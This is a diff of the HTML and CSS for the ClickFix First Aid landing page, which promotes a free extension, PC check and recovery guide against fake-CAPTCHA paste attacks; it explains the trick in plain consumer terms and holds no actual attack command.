@@ -5,82 +5,586 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>ClickFix First Aid</title>
 <meta name="description" content="Free, open-source protection against ClickFix fake CAPTCHA attacks: a browser extension that blocks them, a PC check that finds them, and a recovery guide.">
+<meta name="theme-color" content="#12233a">
 <link rel="icon" href="icon-128.png">
+<link rel="preload" href="assets/fonts/public-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <style>
-  :root { --bg:#ffffff; --fg:#0f172a; --muted:#475569; --line:#e2e8f0; --card:#f8fafc; --red:#b91c1c; --red-soft:#fee2e2; --link:#1d4ed8; color-scheme: light dark; }
-  @media (prefers-color-scheme: dark) { :root { --bg:#0b1220; --fg:#e2e8f0; --muted:#94a3b8; --line:#1e293b; --card:#111a2e; --red:#f87171; --red-soft:#3b0d0d; --link:#93c5fd; } }
+  @font-face { font-family: "Public Sans"; src: url("assets/fonts/public-sans-latin-wght-normal.woff2") format("woff2"); font-weight: 100 900; font-display: swap; }
+  @font-face { font-family: "Plex Mono"; src: url("assets/fonts/ibm-plex-mono-latin-400-normal.woff2") format("woff2"); font-weight: 400; font-display: swap; }
+  @font-face { font-family: "Plex Mono"; src: url("assets/fonts/ibm-plex-mono-latin-500-normal.woff2") format("woff2"); font-weight: 500; font-display: swap; }
+
+  :root {
+    --paper: #f3f6fa; --panel: #ffffff; --ink: #12233a; --ink-2: #2b3d55; --muted: #5a6b82; --rule: #d9e1ec; --rule-2: #e8edf4;
+    --signal: #c81e2c; --signal-ink: #ffffff; --signal-soft: #fdecee;
+    --paused: #9a5b00; --paused-soft: #fdf2df;
+    --allowed: #17734a; --allowed-soft: #e3f3ea;
+    --bar: #9fb0c6; --code-bg: #0f1d31; --code-fg: #dfe8f3;
+    --shadow: 0 1px 2px rgba(18, 35, 58, .06), 0 12px 32px -12px rgba(18, 35, 58, .18);
+    color-scheme: light;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --paper: #0c192b; --panel: #12233a; --ink: #e7eef7; --ink-2: #c8d4e3; --muted: #93a5bc; --rule: #22374f; --rule-2: #1a2d44;
+      --signal: #ff5c68; --signal-ink: #1a0b0d; --signal-soft: #3a1820;
+      --paused: #f2b65a; --paused-soft: #33260f;
+      --allowed: #55c995; --allowed-soft: #10301f;
+      --bar: #4b6280; --code-bg: #08131f; --code-fg: #dfe8f3;
+      --shadow: 0 1px 2px rgba(0, 0, 0, .3), 0 16px 40px -16px rgba(0, 0, 0, .6);
+      color-scheme: dark;
+    }
+  }
+
   * { box-sizing: border-box; }
-  body { margin:0; background:var(--bg); color:var(--fg); font:16px/1.6 system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif; }
-  main { max-width: 860px; margin: 0 auto; padding: 40px 16px 64px; }
-  .brand { display:flex; align-items:center; gap:12px; font-weight:700; }
-  .brand img { width: 40px; height: 40px; }
-  h1 { font-size: clamp(30px, 6vw, 46px); line-height: 1.12; margin: 22px 0 12px; }
-  h2 { font-size: 24px; margin: 44px 0 10px; }
-  h3 { font-size: 18px; margin: 0 0 6px; }
-  .lead { font-size: 19px; color: var(--muted); max-width: 680px; }
-  .grid { display:grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 14px; margin-top: 22px; }
-  .card { border:1px solid var(--line); background: var(--card); border-radius: 14px; padding: 18px; }
-  .tag { display:inline-block; font-size:12px; font-weight:700; letter-spacing:.06em; text-transform:uppercase; color: var(--red); background: var(--red-soft); border-radius:999px; padding:3px 10px; margin-bottom: 8px; }
-  .cta { display:flex; flex-wrap:wrap; gap:10px; margin-top: 22px; }
-  .btn { display:inline-block; text-decoration:none; font-weight:600; border-radius:10px; padding:11px 18px; border:1px solid var(--line); color: var(--fg); }
-  .btn.primary { background: var(--red); border-color: var(--red); color:#fff; }
-  @media (prefers-color-scheme: dark) { .btn.primary { color:#0b1220; } }
-  ol li, ul li { margin: 6px 0; }
-  code { font: 14px ui-monospace, Consolas, monospace; background: var(--card); border:1px solid var(--line); padding: 1px 6px; border-radius: 6px; }
-  a { color: var(--link); }
-  footer { margin-top: 56px; border-top:1px solid var(--line); padding-top: 14px; color: var(--muted); font-size: 14px; }
+  html { scroll-behavior: smooth; }
+  @media (prefers-reduced-motion: reduce) { html { scroll-behavior: auto; } }
+  body { margin: 0; background: var(--paper); color: var(--ink); font: 17px/1.6 "Public Sans", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif; -webkit-font-smoothing: antialiased; }
+  a { color: inherit; text-underline-offset: 3px; text-decoration-thickness: 1px; }
+  a:hover { text-decoration-thickness: 2px; }
+  :focus-visible { outline: 3px solid var(--signal); outline-offset: 3px; border-radius: 4px; }
+  code, .mono { font-family: "Plex Mono", ui-monospace, Consolas, monospace; }
+  code { font-size: .86em; background: var(--rule-2); padding: 1px 6px; border-radius: 5px; }
+  img { max-width: 100%; display: block; }
+  .wrap { max-width: 1180px; margin: 0 auto; padding: 0 24px; }
+  @media (max-width: 600px) { .wrap { padding: 0 16px; } }
+  .skip { position: absolute; left: -9999px; }
+  .skip:focus { left: 16px; top: 12px; background: var(--panel); padding: 8px 12px; z-index: 10; }
+
+  /* Top bar */
+  .top { position: sticky; top: 0; z-index: 5; background: color-mix(in srgb, var(--paper) 88%, transparent); backdrop-filter: saturate(1.4) blur(10px); border-bottom: 1px solid var(--rule); }
+  .top .wrap { display: flex; align-items: center; gap: 28px; height: 64px; }
+  .brand { display: flex; align-items: center; gap: 10px; font-weight: 750; letter-spacing: -.01em; text-decoration: none; }
+  .brand img { width: 28px; height: 28px; }
+  .nav { display: flex; gap: 22px; margin-left: auto; font-size: 15px; }
+  .nav a { text-decoration: none; color: var(--ink-2); }
+  .nav a:hover { color: var(--ink); text-decoration: underline; }
+  .top .btn { padding: 8px 14px; font-size: 15px; }
+  @media (max-width: 860px) { .nav { display: none; } .top .btn { margin-left: auto; } }
+
+  /* Buttons */
+  .btn { display: inline-flex; align-items: center; gap: 8px; font: inherit; font-weight: 650; font-size: 16px; text-decoration: none; border-radius: 8px; padding: 12px 18px; border: 1px solid var(--rule); background: var(--panel); color: var(--ink); cursor: pointer; }
+  .btn:hover { border-color: var(--ink-2); text-decoration: none; }
+  .btn.primary { background: var(--signal); border-color: var(--signal); color: var(--signal-ink); }
+  .btn.primary:hover { filter: brightness(1.06); }
+
+  /* Hero */
+  .hero { padding: 72px 0 64px; }
+  .hero .wrap { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1.02fr); gap: 56px; align-items: center; }
+  h1 { font-size: clamp(40px, 5.4vw, 66px); line-height: 1.02; letter-spacing: -.035em; font-weight: 820; margin: 0 0 22px; text-wrap: balance; }
+  .lede { font-size: 20px; line-height: 1.55; color: var(--ink-2); margin: 0 0 30px; max-width: 34em; }
+  .cta { display: flex; flex-wrap: wrap; gap: 12px; }
+  .also { margin: 20px 0 0; font-size: 16px; color: var(--muted); display: flex; flex-wrap: wrap; gap: 6px 22px; }
+  .also a { color: var(--ink); font-weight: 600; }
+  .fine { margin: 28px 0 0; font-size: 15px; color: var(--muted); max-width: 34em; }
+  @media (max-width: 980px) { .hero { padding: 44px 0 48px; } .hero .wrap { grid-template-columns: 1fr; gap: 40px; } }
+
+  /* Hero console: the one moving part of the page */
+  .console { background: var(--panel); border: 1px solid var(--rule); border-radius: 16px; box-shadow: var(--shadow); overflow: hidden; }
+  .console-bar { display: flex; align-items: center; justify-content: space-between; gap: 12px; padding: 12px 14px; border-bottom: 1px solid var(--rule); background: var(--rule-2); }
+  .console-bar .title { font-size: 14px; font-weight: 650; color: var(--ink-2); padding-left: 4px; }
+  .seg { display: inline-flex; background: var(--paper); border: 1px solid var(--rule); border-radius: 9px; padding: 3px; }
+  .seg button { font: inherit; font-size: 14px; font-weight: 650; border: 0; background: transparent; color: var(--muted); padding: 7px 12px; border-radius: 6px; cursor: pointer; }
+  .seg button[aria-pressed="true"] { background: var(--panel); color: var(--ink); box-shadow: 0 1px 2px rgba(18, 35, 58, .15); }
+  .flow { list-style: none; margin: 0; padding: 6px 20px 8px; }
+  .flow > li { display: grid; grid-template-columns: 28px minmax(0, 1fr); gap: 14px; padding: 16px 0; border-bottom: 1px solid var(--rule-2); }
+  .flow > li:last-child { border-bottom: 0; }
+  .n { width: 28px; height: 28px; border-radius: 50%; border: 1.5px solid var(--rule); display: grid; place-items: center; font-size: 13px; font-weight: 700; color: var(--muted); }
+  .flow h3 { font-size: 15px; font-weight: 700; margin: 3px 0 10px; }
+  .flow p { margin: 8px 0 0; font-size: 14.5px; color: var(--muted); }
+  .fakecheck { display: inline-flex; align-items: center; gap: 10px; border: 1px solid var(--rule); border-radius: 6px; padding: 9px 14px 9px 10px; font-size: 15px; background: var(--paper); }
+  .fakecheck .box { width: 22px; height: 22px; border-radius: 4px; border: 2px solid var(--allowed); color: var(--allowed); display: grid; place-items: center; font-size: 14px; font-weight: 800; }
+  .clip { position: relative; margin: 0; padding: 12px 14px; border-radius: 8px; background: var(--code-bg); color: var(--code-fg); font: 13.5px/1.55 "Plex Mono", ui-monospace, Consolas, monospace; white-space: pre-wrap; word-break: break-word; min-height: 5.2em; overflow: hidden; }
+  .clip::after { content: ""; position: absolute; inset: 0; background: linear-gradient(90deg, transparent, color-mix(in srgb, var(--allowed) 45%, transparent), transparent); transform: translateX(-100%); pointer-events: none; }
+  .console.swapping .clip::after { animation: sweep .7s ease-out; }
+  @keyframes sweep { to { transform: translateX(100%); } }
+  .chip { display: inline-flex; align-items: center; gap: 6px; font-size: 13px; font-weight: 700; padding: 3px 10px; border-radius: 999px; margin-top: 10px; }
+  .chip::before { content: ""; width: 7px; height: 7px; border-radius: 50%; background: currentColor; }
+  .run { border: 1px solid var(--rule); border-radius: 8px; overflow: hidden; background: var(--paper); }
+  .run-title { font-size: 13px; font-weight: 650; padding: 6px 12px; border-bottom: 1px solid var(--rule); color: var(--ink-2); background: var(--panel); }
+  .run-body { display: grid; grid-template-columns: auto minmax(0, 1fr); align-items: center; gap: 10px; padding: 12px; font-size: 14px; }
+  .run-field { border: 1px solid var(--rule); background: var(--panel); border-radius: 4px; padding: 5px 8px; font: 13px "Plex Mono", ui-monospace, Consolas, monospace; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .result { font-size: 14.5px; font-weight: 650; margin: 10px 0 0; display: flex; gap: 8px; align-items: baseline; }
+  .console[data-mode="off"] .on-only, .console[data-mode="on"] .off-only { display: none; }
+  .console[data-mode="off"] .chip, .console[data-mode="off"] .result { color: var(--signal); }
+  .console[data-mode="off"] .chip { background: var(--signal-soft); }
+  .console[data-mode="on"] .chip, .console[data-mode="on"] .result { color: var(--allowed); }
+  .console[data-mode="on"] .chip { background: var(--allowed-soft); }
+  .console[data-mode="on"] .clip { color: #b8f0d2; }
+  @media (prefers-color-scheme: light) { .console[data-mode="on"] .clip { color: #a7ecc6; } }
+  @media (max-width: 520px) { .console-bar { flex-direction: column; align-items: stretch; } .seg { width: 100%; } .seg button { flex: 1; } }
+
+  /* Fact band */
+  .fact { background: var(--ink); color: var(--paper); }
+  @media (prefers-color-scheme: dark) { .fact { background: #e7eef7; color: #0c192b; } }
+  .fact .wrap { display: grid; grid-template-columns: auto minmax(0, 1fr); gap: 28px; align-items: center; padding-top: 34px; padding-bottom: 34px; }
+  .fact .big { font-size: clamp(52px, 7vw, 84px); font-weight: 830; letter-spacing: -.04em; line-height: 1; }
+  .fact p { margin: 0; font-size: 19px; max-width: 46em; }
+  .fact small { display: block; margin-top: 8px; font-size: 14px; opacity: .75; }
+  @media (max-width: 640px) { .fact .wrap { grid-template-columns: 1fr; gap: 10px; } }
+
+  /* Sections */
+  section.block { padding: 96px 0; }
+  section.block + section.block { border-top: 1px solid var(--rule); }
+  .head { max-width: 760px; margin-bottom: 48px; }
+  h2 { font-size: clamp(30px, 3.6vw, 44px); line-height: 1.08; letter-spacing: -.028em; font-weight: 800; margin: 0 0 14px; text-wrap: balance; }
+  .head p { margin: 0; font-size: 19px; color: var(--ink-2); }
+  @media (max-width: 700px) { section.block { padding: 64px 0; } .head { margin-bottom: 32px; } }
+
+  /* How it works: an attack timeline */
+  .timeline { display: grid; grid-template-columns: 1fr 1fr; gap: 0; border: 1px solid var(--rule); border-radius: 16px; background: var(--panel); overflow: hidden; }
+  .stage.first { grid-column: 1 / -1; display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 40px; align-items: center; border-right: 0; border-bottom: 1px solid var(--rule); padding: 36px; }
+  .stage.first .shot { margin: 0; }
+  .first-text { display: flex; flex-direction: column; }
+  .stage { padding: 28px; border-right: 1px solid var(--rule); display: flex; flex-direction: column; }
+  .stage:last-child { border-right: 0; }
+  .when { display: flex; align-items: center; gap: 10px; font-size: 14px; font-weight: 700; color: var(--muted); margin-bottom: 14px; }
+  .when .n { width: 26px; height: 26px; }
+  .stage h3 { font-size: 23px; letter-spacing: -.015em; line-height: 1.2; margin: 0 0 10px; }
+  .stage p { margin: 0 0 14px; color: var(--ink-2); font-size: 16px; }
+  .stage ul { margin: 0 0 16px; padding-left: 18px; color: var(--ink-2); font-size: 16px; }
+  .stage li { margin: 5px 0; }
+  .stage .go { margin-top: auto; font-weight: 650; font-size: 16px; }
+  .shot { margin: 6px 0 22px; border-radius: 12px; overflow: hidden; border: 1px solid var(--rule); background: #ffffff; }
+  .shot img { margin: -1px; width: calc(100% + 2px); max-width: none; }
+  .shot img { height: auto; }
+  .scan { margin: 4px 0 18px; border: 1px solid var(--rule); border-radius: 10px; overflow: hidden; font-size: 14px; }
+  .scan div { display: flex; justify-content: space-between; gap: 10px; padding: 8px 12px; border-bottom: 1px solid var(--rule-2); }
+  .scan div:last-child { border-bottom: 0; }
+  .scan span:last-child { color: var(--allowed); font-weight: 650; }
+  .steps-mini { margin: 4px 0 18px; padding: 0; list-style: none; counter-reset: s; font-size: 15px; }
+  .steps-mini li { counter-increment: s; display: flex; gap: 10px; padding: 7px 0; border-bottom: 1px solid var(--rule-2); }
+  .steps-mini li::before { content: counter(s); flex: none; width: 22px; height: 22px; border-radius: 50%; background: var(--signal-soft); color: var(--signal); font-size: 12px; font-weight: 800; display: grid; place-items: center; margin-top: 1px; }
+  @media (max-width: 860px) { .timeline { grid-template-columns: 1fr; } .stage, .stage.first { border-right: 0; border-bottom: 1px solid var(--rule); padding: 26px; } .stage.first { grid-template-columns: 1fr; gap: 24px; } .stage:last-child { border-bottom: 0; } }
+  .extras { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-top: 24px; }
+  .extra { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, .9fr); gap: 22px; align-items: center; background: var(--panel); border: 1px solid var(--rule); border-radius: 16px; padding: 24px; }
+  .extra h3 { font-size: 19px; margin: 0 0 8px; letter-spacing: -.01em; }
+  .extra p { margin: 0; color: var(--ink-2); font-size: 15.5px; }
+  .extra .shot { margin: 0; background: transparent; }
+  @media (max-width: 980px) { .extras { grid-template-columns: 1fr; } }
+  @media (max-width: 520px) { .extra { grid-template-columns: 1fr; } }
+
+  /* Results dashboard */
+  .kpis { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); border: 1px solid var(--rule); border-radius: 16px; background: var(--panel); overflow: hidden; margin-bottom: 24px; }
+  .kpi { padding: 22px 24px; border-right: 1px solid var(--rule); }
+  .kpi:last-child { border-right: 0; }
+  .kpi .v { font-size: 40px; font-weight: 800; letter-spacing: -.03em; line-height: 1.05; }
+  .kpi .v small { font-size: 20px; font-weight: 650; color: var(--muted); letter-spacing: 0; }
+  .kpi .l { font-size: 15px; color: var(--ink-2); margin-top: 6px; }
+  .kpi.good .v { color: var(--allowed); }
+  @media (max-width: 900px) { .kpis { grid-template-columns: 1fr 1fr; } .kpi:nth-child(2) { border-right: 0; } .kpi:nth-child(-n+2) { border-bottom: 1px solid var(--rule); } }
+  @media (max-width: 460px) { .kpis { grid-template-columns: 1fr; } .kpi { border-right: 0; border-bottom: 1px solid var(--rule); } .kpi:last-child { border-bottom: 0; } }
+  .board { background: var(--panel); border: 1px solid var(--rule); border-radius: 16px; overflow: hidden; }
+  .board-head { display: flex; flex-wrap: wrap; justify-content: space-between; align-items: baseline; gap: 8px 20px; padding: 18px 24px; border-bottom: 1px solid var(--rule); }
+  .board-head h3 { margin: 0; font-size: 17px; }
+  .board-head span { font-size: 14px; color: var(--muted); }
+  table.cmp { width: 100%; border-collapse: collapse; font-size: 15px; }
+  .cmp th, .cmp td { text-align: left; padding: 14px 24px; border-bottom: 1px solid var(--rule-2); vertical-align: middle; }
+  .cmp thead th { font-size: 13.5px; font-weight: 650; color: var(--muted); background: var(--rule-2); border-bottom: 1px solid var(--rule); }
+  .cmp tbody tr:last-child td, .cmp tbody tr:last-child th { border-bottom: 0; }
+  .cmp tbody th { font-weight: 650; width: 28%; }
+  .cmp tbody th small { display: block; font-weight: 400; font-size: 13px; color: var(--muted); }
+  .cmp tr.us th, .cmp tr.us td { background: color-mix(in srgb, var(--signal-soft) 55%, transparent); }
+  .cell { display: grid; grid-template-columns: 3.2em minmax(0, 1fr); align-items: center; gap: 10px; }
+  .cell b { font-weight: 700; font-variant-numeric: tabular-nums; }
+  .meter { height: 8px; border-radius: 4px; background: var(--rule-2); overflow: hidden; }
+  .meter i { display: block; height: 100%; border-radius: 4px; background: var(--bar); }
+  .us .meter i { background: var(--signal); }
+  .meter.ok i { background: color-mix(in srgb, var(--allowed) 70%, var(--bar)); }
+  .us .meter.ok i { background: var(--allowed); }
+  .cell em { grid-column: 2; font-style: normal; font-size: 13px; color: var(--muted); margin-top: -4px; white-space: nowrap; }
+  .flag { display: inline-block; margin-left: 6px; font-size: 12px; font-weight: 650; color: var(--paused); background: var(--paused-soft); border-radius: 999px; padding: 1px 8px; vertical-align: 1px; }
+  .board-notes { padding: 18px 24px 22px; border-top: 1px solid var(--rule); font-size: 15px; color: var(--ink-2); display: grid; gap: 8px; }
+  .board-notes p { margin: 0; }
+  .board-links { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 24px; }
+  @media (max-width: 820px) {
+    .cmp thead { display: none; }
+    .cmp, .cmp tbody, .cmp tr, .cmp th, .cmp td { display: block; width: 100%; }
+    .cmp tbody tr { border-bottom: 1px solid var(--rule); padding: 10px 0; }
+    .cmp tbody tr:last-child { border-bottom: 0; }
+    .cmp tbody th { width: 100%; padding: 8px 16px 4px; border: 0; }
+    .cmp td { padding: 6px 16px; border: 0; }
+    .cmp td::before { content: attr(data-label); display: block; font-size: 13px; color: var(--muted); margin-bottom: 2px; }
+    .board-head, .board-notes { padding-left: 16px; padding-right: 16px; }
+  }
+
+  /* Privacy spec sheet */
+  .spec { display: grid; grid-template-columns: minmax(0, .8fr) minmax(0, 1.2fr); gap: 56px; align-items: start; }
+  .spec dl { margin: 0; background: var(--panel); border: 1px solid var(--rule); border-radius: 16px; overflow: hidden; }
+  .spec dl > div { display: grid; grid-template-columns: 11em minmax(0, 1fr); gap: 20px; padding: 18px 24px; border-bottom: 1px solid var(--rule-2); }
+  .spec dl > div:last-child { border-bottom: 0; }
+  .spec dt { font-weight: 700; font-size: 15.5px; }
+  .spec dd { margin: 0; color: var(--ink-2); font-size: 15.5px; }
+  .spec dd strong { color: var(--allowed); }
+  @media (max-width: 900px) { .spec { grid-template-columns: 1fr; gap: 28px; } }
+  @media (max-width: 560px) { .spec dl > div { grid-template-columns: 1fr; gap: 4px; padding: 16px; } }
+
+  /* Install */
+  .install { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 24px; align-items: start; }
+  .install .col { display: grid; gap: 24px; }
+  .how { background: var(--panel); border: 1px solid var(--rule); border-radius: 16px; padding: 26px; display: flex; flex-direction: column; }
+  .how h3 { font-size: 21px; letter-spacing: -.015em; margin: 0 0 6px; }
+  .how > p { margin: 0 0 16px; color: var(--ink-2); font-size: 16px; }
+  .how ol { margin: 0 0 18px; padding-left: 20px; font-size: 15.5px; color: var(--ink-2); }
+  .how li { margin: 7px 0; }
+  .how .btn { margin-top: auto; align-self: flex-start; }
+  .warn { margin: 0 0 18px; padding: 12px 14px; border-radius: 10px; background: var(--paused-soft); color: var(--paused); font-size: 15px; }
+  .how.optional { background: transparent; border-style: dashed; }
+  .how.optional p { margin: 0; font-size: 16px; color: var(--ink-2); }
+  .how.optional strong { color: var(--ink); }
+  @media (max-width: 900px) { .install { grid-template-columns: 1fr; } }
+
+  /* Help band */
+  .help { background: var(--signal-soft); border-top: 1px solid color-mix(in srgb, var(--signal) 25%, transparent); border-bottom: 1px solid color-mix(in srgb, var(--signal) 25%, transparent); }
+  .help .wrap { display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 24px; padding-top: 48px; padding-bottom: 48px; }
+  .help h2 { font-size: clamp(26px, 3vw, 36px); margin: 0 0 8px; }
+  .help p { margin: 0; font-size: 18px; color: var(--ink-2); max-width: 40em; }
+
+  footer { padding: 40px 0 56px; font-size: 15px; color: var(--muted); }
+  footer .wrap { display: flex; flex-wrap: wrap; justify-content: space-between; gap: 16px 32px; }
+  footer nav { display: flex; flex-wrap: wrap; gap: 8px 22px; }
+  footer a { color: var(--ink-2); }
 </style>
 </head>
 <body>
-<main>
-  <div class="brand"><img src="icon-128.png" alt=""> ClickFix First Aid</div>
-  <h1>Fake "I am not a robot" pages are stealing accounts. This stops them.</h1>
-  <p class="lead">A ClickFix page pretends to be a CAPTCHA, secretly copies a command, and tells you to press Win+R, paste and press Enter. That one paste installs malware that steals your logins. ClickFix First Aid blocks the trick, checks whether your PC already fell for it, and walks you through recovery.</p>
-  <div class="cta">
-    <a class="btn primary" href="https://microsoftedge.microsoft.com/addons/detail/adghmlcmbimmjfjofhgndnoccnpgenmh">Get it for Microsoft Edge</a>
-    <a class="btn" href="https://github.com/vinaykumarchowdary18/clickfix-first-aid/releases/latest">Download for Chrome</a>
-    <a class="btn" href="demo.html">Try the safe demo</a>
-    <a class="btn" href="recovery.html">I already ran something</a>
-    <a class="btn" href="https://github.com/vinaykumarchowdary18/clickfix-first-aid/blob/main/report/ClickFix-First-Aid-Technical-Report.pdf">Technical report</a>
+<a class="skip" href="#main">Skip to content</a>
+<header class="top">
+  <div class="wrap">
+    <a class="brand" href="./"><img src="icon-128.png" alt="" width="28" height="28">ClickFix First Aid</a>
+    <nav class="nav" aria-label="Sections">
+      <a href="#how">How it works</a>
+      <a href="#results">Test results</a>
+      <a href="#privacy">Privacy</a>
+      <a href="#install">Install</a>
+      <a href="recovery.html">Get help</a>
+    </nav>
+    <a class="btn primary" href="https://microsoftedge.microsoft.com/addons/detail/adghmlcmbimmjfjofhgndnoccnpgenmh">Add to Edge</a>
+  </div>
+</header>
+
+<main id="main">
+  <section class="hero">
+    <div class="wrap">
+      <div>
+        <h1>Stop fake &ldquo;I&rsquo;m not a robot&rdquo; pages before you paste.</h1>
+        <p class="lede">These pages secretly copy a command and tell you to press Win+R, paste and press Enter. That one paste installs malware that steals your logins. ClickFix First Aid swaps the command for a harmless message, so the paste does nothing.</p>
+        <div class="cta">
+          <a class="btn primary" href="https://microsoftedge.microsoft.com/addons/detail/adghmlcmbimmjfjofhgndnoccnpgenmh">Add to Microsoft Edge</a>
+          <a class="btn" href="#install">Install in Chrome</a>
+        </div>
+        <p class="also"><a href="demo.html">Try the safe demo</a><a href="recovery.html">I already ran something</a></p>
+        <p class="fine">Free and open source. No account, no tracking, and the extension never connects to the internet.</p>
+      </div>
+
+      <section class="console" id="console" data-mode="on" aria-label="What happens when you follow a fake check">
+        <div class="console-bar">
+          <span class="title">What you would paste</span>
+          <div class="seg" role="group" aria-label="Show the result">
+            <button type="button" data-mode="off" aria-pressed="false">Without protection</button>
+            <button type="button" data-mode="on" aria-pressed="true">With ClickFix First Aid</button>
+          </div>
+        </div>
+        <ol class="flow">
+          <li>
+            <span class="n">1</span>
+            <div>
+              <h3>You tick the box</h3>
+              <div class="fakecheck" aria-hidden="true"><span class="box">&#10003;</span>I&rsquo;m not a robot</div>
+              <p>Then the page says: press Win+R, press Ctrl+V, press Enter.</p>
+            </div>
+          </li>
+          <li>
+            <span class="n">2</span>
+            <div>
+              <h3>The page puts this on your clipboard</h3>
+              <pre class="clip" id="clip"></pre>
+              <span class="chip off-only">Hidden command, example shortened</span>
+              <span class="chip on-only">Swapped for a harmless message</span>
+            </div>
+          </li>
+          <li>
+            <span class="n">3</span>
+            <div>
+              <h3>You paste it into the Run box</h3>
+              <div class="run" aria-hidden="true">
+                <div class="run-title">Run</div>
+                <div class="run-body"><span>Open:</span><span class="run-field" id="runfield"></span></div>
+              </div>
+              <p class="result off-only">PowerShell starts out of sight, downloads a script and runs it.</p>
+              <p class="result on-only">Nothing harmful runs. The warning has already told you to close the page.</p>
+            </div>
+          </li>
+        </ol>
+      </section>
+    </div>
+  </section>
+
+  <div class="fact">
+    <div class="wrap">
+      <div class="big">47%</div>
+      <p>ClickFix was the most common way in for the attacks Microsoft Defender Experts saw in the past year, ahead of every other method.<small>Microsoft Digital Defense Report 2025, page 36 (Microsoft fiscal year 2025, July 2024 to June 2025)</small></p>
+    </div>
   </div>
 
-  <div class="grid">
-    <div class="card"><span class="tag">Stop it</span><h3>Browser extension</h3><p>For Chrome and Edge. When a page tries to put an attack command on your clipboard, it swaps it for a harmless message and shows a clear warning. Installers copied by a page are paused until you choose Copy anyway. You can also paste a command into it to check it before you run it.</p></div>
-    <div class="card"><span class="tag">Check it</span><h3>PC check</h3><p>A read-only Windows script that looks at your Run box, File Explorer and PowerShell history, new programs and startup items for signs of an attack.</p></div>
-    <div class="card"><span class="tag">Fix it</span><h3>Recovery guide</h3><p>The exact steps, in the right order, to cut off stolen sign-ins from your phone and clean your PC.</p></div>
-  </div>
+  <section class="block" id="how">
+    <div class="wrap">
+      <div class="head">
+        <h2>Protection before, during and after an attack</h2>
+        <p>One extension stops the paste. If something already ran, a PC check and a recovery plan take over.</p>
+      </div>
+      <div class="timeline">
+        <article class="stage first">
+          <div class="first-text">
+            <div class="when"><span class="n">1</span>Before you paste</div>
+            <h3>Browser extension for Chrome and Edge</h3>
+            <p>Runs on every page you open and checks what the page tries to put on your clipboard.</p>
+            <ul>
+              <li>Swaps attack commands for a harmless message and shows a clear warning.</li>
+              <li>Covers all five ways a page can write to your clipboard, including frames.</li>
+              <li>Warns you on pages that show fake verification steps.</li>
+            </ul>
+            <a class="go" href="#install">Install the extension</a>
+          </div>
+          <div class="shot"><img src="assets/img/warning.webp" width="1160" height="996" alt="ClickFix First Aid warning: Stop. This page tried to trick you. Your clipboard was replaced with a harmless message."></div>
+        </article>
+        <article class="stage">
+          <div class="when"><span class="n">2</span>If you already pasted</div>
+          <h3>PC check for Windows</h3>
+          <p>A read-only PowerShell script that looks for signs of an attack. It changes nothing and sends nothing anywhere.</p>
+          <div class="scan" aria-label="What the PC check looks at">
+            <div><span>Run box history</span><span>Checked</span></div>
+            <div><span>File Explorer and PowerShell history</span><span>Checked</span></div>
+            <div><span>New programs</span><span>Checked</span></div>
+            <div><span>Startup items</span><span>Checked</span></div>
+          </div>
+          <a class="go" href="#check">Run the PC check</a>
+        </article>
+        <article class="stage">
+          <div class="when"><span class="n">3</span>Afterwards</div>
+          <h3>Recovery guide</h3>
+          <p>The steps in the right order, built into the extension so it works offline.</p>
+          <ol class="steps-mini">
+            <li>Disconnect the affected computer</li>
+            <li>Secure your email from your phone</li>
+            <li>Sign out everywhere else</li>
+            <li>Clean the computer</li>
+            <li>Keep watch</li>
+          </ol>
+          <a class="go" href="recovery.html">Open the recovery guide</a>
+        </article>
+      </div>
 
-  <h2 id="install">Install the browser extension</h2>
-  <p><strong>Microsoft Edge:</strong> install it from the <a href="https://microsoftedge.microsoft.com/addons/detail/adghmlcmbimmjfjofhgndnoccnpgenmh">Microsoft Edge Add-ons store</a>.</p>
-  <p><strong>Chrome</strong>, until it is in the Chrome Web Store:</p>
-  <ol>
-    <li>Download <code>clickfix-first-aid-extension-v0.3.3.zip</code> from the <a href="https://github.com/vinaykumarchowdary18/clickfix-first-aid/releases/latest">latest release</a> and unzip it.</li>
-    <li>Open <code>chrome://extensions</code> and switch on <strong>Developer mode</strong>.</li>
-    <li>Click <strong>Load unpacked</strong> and choose the unzipped folder.</li>
-  </ol>
-  <p>Then open the <a href="demo.html">safe demo</a> and tick the box. You should see a red warning.</p>
+      <div class="extras">
+        <div class="extra">
+          <div>
+            <h3>Installers wait for one click</h3>
+            <p>Genuine install commands look like attacks. When a site&rsquo;s copy button copies one, it is paused until you choose Copy anyway or allow that site. Commands you select and copy yourself are never paused.</p>
+          </div>
+          <div class="shot"><img src="assets/img/paused.webp" width="860" height="735" alt="Panel: ClickFix First Aid paused a copied command, with Copy anyway and Always allow on this site buttons." loading="lazy"></div>
+        </div>
+        <div class="extra">
+          <div>
+            <h3>Check a command before you run it</h3>
+            <p>Paste anything a site asked you to run into the extension. It is only read, never run, and it stays on your computer. The popup also counts what it blocked and paused.</p>
+          </div>
+          <div class="shot"><img src="assets/img/popup.webp" width="680" height="700" alt="The extension popup: protection is on, with counts of attacks blocked, trap pages spotted and copies paused." loading="lazy"></div>
+        </div>
+      </div>
+    </div>
+  </section>
 
-  <h2 id="check-your-pc">Check your Windows PC</h2>
-  <ol>
-    <li>Download <code>Check-ClickFix.ps1</code> from the <a href="https://github.com/vinaykumarchowdary18/clickfix-first-aid/releases/latest">latest release</a>.</li>
-    <li>Right-click the file and choose <strong>Run with PowerShell</strong>.</li>
-    <li>Read the result. It only reads your PC. It changes nothing and sends nothing anywhere.</li>
-  </ol>
-  <p><strong>Never</strong> run this, or anything else, by pasting a command a website gave you. That is exactly the trick this project protects you from.</p>
+  <section class="block" id="results">
+    <div class="wrap">
+      <div class="head">
